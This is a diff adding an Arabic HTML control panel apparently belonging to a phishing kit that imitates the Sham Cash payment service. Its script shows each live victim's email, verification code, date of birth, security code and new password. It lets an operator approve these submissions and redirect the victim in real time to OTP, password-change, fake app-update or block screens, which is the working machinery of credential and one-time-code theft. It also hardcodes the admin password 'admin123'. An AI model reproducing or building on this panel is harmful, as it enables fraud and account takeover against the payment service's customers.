@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>شام كاش — لوحة التحكم</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body { overflow-y: auto; }
+    .dash-page { min-height: 100vh; max-width: 640px; margin: 0 auto; display: flex; flex-direction: column; }
+
+    /* tab bar */
+    .tab-bar {
+      display: flex; border-bottom: 1px solid rgba(255,255,255,0.06);
+      background: rgba(42,48,71,0.50); position: sticky; top: 0; z-index: 10;
+    }
+    .tab-btn {
+      flex: 1; padding: 14px 8px;
+      font-size: 13px; font-weight: 700; color: rgba(201,204,219,0.55);
+      background: none; border: none; cursor: pointer;
+      border-bottom: 2px solid transparent; transition: color .15s, border-color .15s;
+    }
+    .tab-btn.active { color: #fff; border-bottom-color: var(--accent); }
+
+    /* panels */
+    .panel { display: none; padding: 16px; }
+    .panel.active { display: block; }
+
+    /* admin login overlay */
+    .admin-overlay {
+      position: fixed; inset: 0; z-index: 100;
+      background: rgba(13,27,42,0.96);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .admin-login-card {
+      width: 90%; max-width: 340px;
+      background: var(--bg-card); border-radius: 20px;
+      padding: 32px 24px; display: flex; flex-direction: column; gap: 16px;
+      border: 1px solid rgba(255,255,255,0.06);
+    }
+
+    /* empty state */
+    .empty-state {
+      display: flex; flex-direction: column; align-items: center;
+      justify-content: center; gap: 12px; padding: 60px 24px; text-align: center;
+    }
+    .empty-state .icon { font-size: 48px; opacity: .35; }
+    .empty-state p { font-size: 14px; font-weight: 600; color: var(--text-dim); }
+
+    /* data table */
+    .data-table { width: 100%; border-collapse: collapse; margin-top: 8px; }
+    .data-table th {
+      font-size: 12px; font-weight: 700; letter-spacing: .06em;
+      color: var(--text-faint); text-align: right; padding: 6px 12px;
+      border-bottom: 1px solid rgba(255,255,255,0.06); text-transform: uppercase;
+    }
+    .data-table td {
+      font-size: 14px; font-weight: 600; color: var(--text);
+      padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,0.04);
+      vertical-align: middle;
+    }
+    .data-table tr:hover td { background: rgba(255,255,255,0.02); }
+  </style>
+</head>
+<body>
+  <!-- Admin login overlay -->
+  <div class="admin-overlay" id="adminOverlay">
+    <div class="admin-login-card">
+      <div style="display:flex;justify-content:center;margin-bottom:4px">
+        <div class="sham-logo" style="transform:scale(0.7);margin:-20px">
+          <div class="shape-green"></div>
+          <div class="shape-purple"></div>
+        </div>
+      </div>
+      <h2 style="font-size:20px;font-weight:900;text-align:center">لوحة التحكم</h2>
+      <p style="font-size:13px;font-weight:600;color:var(--text-dim);text-align:center">أدخل كلمة مرور المشرف للمتابعة</p>
+      <div class="field">
+        <span class="field-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
+          </svg>
+        </span>
+        <input type="password" id="adminPass" placeholder="كلمة المرور" autocomplete="current-password"
+               onkeydown="if(event.key==='Enter')adminLogin()" />
+      </div>
+      <p id="adminErr" class="hidden" style="color:#e54343;font-size:13px;font-weight:600;text-align:center">كلمة المرور غير صحيحة</p>
+      <button onclick="adminLogin()" class="btn btn-primary btn-full" style="font-size:17px">دخول</button>
+      <a href="index.html" style="font-size:13px;font-weight:600;color:var(--text-dim);text-align:center;text-decoration:none">
+        ← العودة للموقع
+      </a>
+    </div>
+  </div>
+
+  <!-- Dashboard (shown after login) -->
+  <div class="page hidden" id="dashContent">
+    <div class="dash-page">
+      <!-- Header -->
+      <div class="dash-header" style="background:rgba(21,28,54,0.95);position:sticky;top:0;z-index:9">
+        <div style="display:flex;align-items:center;gap:10px">
+          <div class="sham-logo" style="transform:scale(0.45);margin:-36px -24px;flex-shrink:0">
+            <div class="shape-green"></div>
+            <div class="shape-purple"></div>
+          </div>
+          <h1 style="font-size:17px;font-weight:900">شام كاش — لوحة التحكم</h1>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <span class="dot-live"></span>
+          <span id="liveCount" style="font-size:13px;font-weight:700;color:var(--green)">0 متصل</span>
+          <button onclick="adminLogout()" style="font-size:12px;font-weight:700;color:rgba(255,255,255,0.40);background:none;border:none;cursor:pointer">خروج</button>
+        </div>
+      </div>
+
+      <!-- Tab bar -->
+      <div class="tab-bar">
+        <button class="tab-btn active" onclick="showTab('visitors')">👥 الزوار</button>
+        <button class="tab-btn" onclick="showTab('requests')">🔐 الطلبات</button>
+        <button class="tab-btn" onclick="showTab('redirect')">↩️ التوجيه</button>
+      </div>
+
+      <!-- Visitors panel -->
+      <div class="panel active" id="tab-visitors">
+        <div id="visitorsList">
+          <div class="empty-state">
+            <div class="icon">👤</div>
+            <p>لا يوجد زوار متصلون حالياً</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Requests panel -->
+      <div class="panel" id="tab-requests">
+        <div id="requestsList">
+          <div class="empty-state">
+            <div class="icon">📋</div>
+            <p>لا توجد طلبات معلّقة</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Redirect panel -->
+      <div class="panel" id="tab-redirect">
+        <p class="section-label">إرسال أمر توجيه للمستخدم الحالي</p>
+
+        <div style="display:flex;flex-direction:column;gap:12px;padding:8px 0">
+          <button onclick="sendCmd('redirect:otp')"
+            class="visitor-card" style="display:flex;align-items:center;gap:14px;padding:16px;border:none;cursor:pointer;width:100%;text-align:right">
+            <div style="width:40px;height:40px;border-radius:50%;background:rgba(101,123,216,0.25);display:flex;align-items:center;justify-content:center;flex-shrink:0">🔐</div>
+            <div>
+              <div style="font-size:15px;font-weight:700">رمز الأمان (OTP)</div>
+              <div style="font-size:12px;font-weight:600;color:var(--text-dim)">توجيه المستخدم لصفحة التحقق</div>
+            </div>
+          </button>
+
+          <button onclick="sendCmd('redirect:changepass')"
+            class="visitor-card" style="display:flex;align-items:center;gap:14px;padding:16px;border:none;cursor:pointer;width:100%;text-align:right">
+            <div style="width:40px;height:40px;border-radius:50%;background:rgba(31,194,138,0.20);display:flex;align-items:center;justify-content:center;flex-shrink:0">🔑</div>
+            <div>
+              <div style="font-size:15px;font-weight:700">تغيير كلمة المرور</div>
+              <div style="font-size:12px;font-weight:600;color:var(--text-dim)">توجيه المستخدم لصفحة تغيير كلمة المرور</div>
+            </div>
+          </button>
+
+          <button onclick="sendCmd('redirect:update')"
+            class="visitor-card" style="display:flex;align-items:center;gap:14px;padding:16px;border:none;cursor:pointer;width:100%;text-align:right">
+            <div style="width:40px;height:40px;border-radius:50%;background:rgba(59,130,246,0.20);display:flex;align-items:center;justify-content:center;flex-shrink:0">🔄</div>
+            <div>
+              <div style="font-size:15px;font-weight:700">تحديث التطبيق</div>
+              <div style="font-size:12px;font-weight:600;color:var(--text-dim)">إظهار صفحة تحديث التطبيق</div>
+            </div>
+          </button>
+
+          <button onclick="sendCmd('redirect:blocked')"
+            class="visitor-card" style="display:flex;align-items:center;gap:14px;padding:16px;border:none;cursor:pointer;width:100%;text-align:right">
+            <div style="width:40px;height:40px;border-radius:50%;background:rgba(229,67,67,0.20);display:flex;align-items:center;justify-content:center;flex-shrink:0">🚫</div>
+            <div>
+              <div style="font-size:15px;font-weight:700">حجب المستخدم</div>
+              <div style="font-size:12px;font-weight:600;color:var(--text-dim)">إظهار شاشة التحذير للمستخدم</div>
+            </div>
+          </button>
+        </div>
+
+        <p id="cmdStatus" class="hidden" style="font-size:13px;font-weight:700;text-align:center;color:var(--green);margin-top:16px">
+          ✅ تم إرسال الأمر
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ── Admin auth ──
+    const ADMIN_PASS = 'admin123'; // change in production
+
+    function adminLogin() {
+      const v = document.getElementById('adminPass').value;
+      if (v === ADMIN_PASS) {
+        document.getElementById('adminOverlay').classList.add('hidden');
+        document.getElementById('dashContent').classList.remove('hidden');
+        sessionStorage.setItem('sham_admin_auth', '1');
+        startPolling();
+      } else {
+        document.getElementById('adminErr').classList.remove('hidden');
+      }
+    }
+
+    function adminLogout() {
+      sessionStorage.removeItem('sham_admin_auth');
+      document.getElementById('adminOverlay').classList.remove('hidden');
+      document.getElementById('dashContent').classList.add('hidden');
+    }
+
+    // Skip login if already authenticated in session
+    if (sessionStorage.getItem('sham_admin_auth')) {
+      document.getElementById('adminOverlay').classList.add('hidden');
+      document.getElementById('dashContent').classList.remove('hidden');
+    }
+
+    // ── Tabs ──
+    function showTab(name) {
+      document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.getElementById('tab-' + name).classList.add('active');
+      event.currentTarget.classList.add('active');
+    }
+
+    // ── Poll localStorage for visitors / requests ──
+    function startPolling() {
+      setInterval(refreshDash, 1000);
+      refreshDash();
+    }
+
+    function refreshDash() {
+      refreshVisitors();
+      refreshRequests();
+    }
+
+    function refreshVisitors() {
+      const id      = localStorage.getItem('sham_visitor_id');
+      const email   = localStorage.getItem('sham_email') || '—';
+      const page    = localStorage.getItem('sham_page')  || '—';
+      const quick   = localStorage.getItem('sham_quick') || '';
+      const dob     = localStorage.getItem('sham_dob')   || '';
+      const hb      = parseInt(localStorage.getItem('sham_visitor_heartbeat') || '0');
+      const alive   = id && (Date.now() - hb < 8000);
+
+      document.getElementById('liveCount').textContent = alive ? '1 متصل' : '0 متصل';
+
+      const el = document.getElementById('visitorsList');
+      if (!alive) {
+        el.innerHTML = `<div class="empty-state"><div class="icon">👤</div><p>لا يوجد زوار متصلون حالياً</p></div>`;
+        return;
+      }
+
+      el.innerHTML = `
+        <div class="visitor-card">
+          <div class="visitor-card-header">
+            <div class="visitor-avatar">👤</div>
+            <div class="visitor-info">
+              <div class="visitor-name">${email}</div>
+              <div class="visitor-meta">الصفحة: ${page} &nbsp;·&nbsp; <span class="dot-live"></span> متصل</div>
+            </div>
+          </div>
+          ${quick ? `<div style="padding:0 16px 4px;font-size:13px;font-weight:600;color:var(--text-dim)">كويك: <span style="color:#fff">${quick}</span>  &nbsp;  تاريخ الميلاد: <span style="color:#fff">${dob}</span></div>` : ''}
+          <div class="control-row">
+            <button onclick="approveVisitor('verify')" class="btn btn-green btn-sm">✅ موافق</button>
+            <button onclick="approveVisitor('otp')" class="btn btn-primary btn-sm">🔐 OTP</button>
+            <button onclick="approveVisitor('changepass')" class="btn btn-sm" style="background:rgba(31,194,138,0.25);color:#1fc28a">🔑 كلمة مرور</button>
+            <button onclick="approveVisitor('block')" class="btn btn-sm" style="background:rgba(229,67,67,0.25);color:#e54343">🚫 حجب</button>
+          </div>
+        </div>`;
+    }
+
+    function approveVisitor(action) {
+      const map = {
+        verify:     'approved',
+        otp:        'redirect:otp',
+        changepass: 'redirect:changepass',
+        block:      'redirect:blocked',
+      };
+      localStorage.setItem('sham_admin_cmd', map[action] || action);
+      // Also set quick statuses
+      if (action === 'verify')     localStorage.setItem('sham_verify_status', 'approved');
+      if (action === 'changepass') localStorage.setItem('sham_changepass_status', 'approved');
+    }
+
+    function refreshRequests() {
+      const items = [];
+
+      const quick  = localStorage.getItem('sham_quick');
+      const dob    = localStorage.getItem('sham_dob');
+      const email  = localStorage.getItem('sham_email');
+      const secCode= localStorage.getItem('sham_sec_code');
+      const newP   = localStorage.getItem('sham_new_pass');
+
+      if (quick) {
+        items.push({ label: 'طلب تحقق', detail: `كويك: ${quick} | تاريخ: ${dob || '—'}`, icon: '🛡️', key: 'verify' });
+      }
+      if (secCode) {
+        items.push({ label: 'تغيير كلمة مرور', detail: `رمز: ${secCode} | كلمة جديدة: ${newP || '—'}`, icon: '🔑', key: 'changepass' });
+      }
+      if (email && !quick && !secCode) {
+        items.push({ label: 'تسجيل دخول', detail: `البريد: ${email}`, icon: '📧', key: 'login' });
+      }
+
+      const el = document.getElementById('requestsList');
+      if (!items.length) {
+        el.innerHTML = `<div class="empty-state"><div class="icon">📋</div><p>لا توجد طلبات معلّقة</p></div>`;
+        return;
+      }
+
+      el.innerHTML = items.map(item => `
+        <div class="visitor-card" style="margin-bottom:12px">
+          <div class="visitor-card-header">
+            <div class="visitor-avatar" style="background:rgba(101,123,216,0.35)">${item.icon}</div>
+            <div class="visitor-info">
+              <div class="visitor-name">${item.label}</div>
+              <div class="visitor-meta">${item.detail}</div>
+            </div>
+          </div>
+          <div class="control-row">
+            <button onclick="approveRequest('${item.key}','approved')" class="btn btn-green btn-sm">✅ موافق</button>
+            <button onclick="approveRequest('${item.key}','rejected')" class="btn btn-sm" style="background:rgba(229,67,67,0.25);color:#e54343">❌ رفض</button>
+          </div>
+        </div>`).join('');
+    }
+
+    function approveRequest(key, status) {
+      if (key === 'verify')     localStorage.setItem('sham_verify_status', status);
+      if (key === 'changepass') localStorage.setItem('sham_changepass_status', status);
+      if (status === 'approved') {
+        // clear data after approval
+        setTimeout(() => {
+          ['sham_quick','sham_dob','sham_sec_code','sham_new_pass'].forEach(k => localStorage.removeItem(k));
+        }, 1500);
+      }
+    }
+
+    // ── Send redirect command ──
+    function sendCmd(cmd) {
+      localStorage.setItem('sham_admin_cmd', cmd);
+      const s = document.getElementById('cmdStatus');
+      s.classList.remove('hidden');
+      setTimeout(() => s.classList.add('hidden'), 2500);
+    }
+
+    // ── Heartbeat: page keeps a heartbeat so dashboard can see it ──
+    setInterval(() => {
+      if (document.hidden) return;
+      localStorage.setItem('sham_visitor_heartbeat', Date.now().toString());
+    }, 2000);
+  </script>
+</body>
+</html>
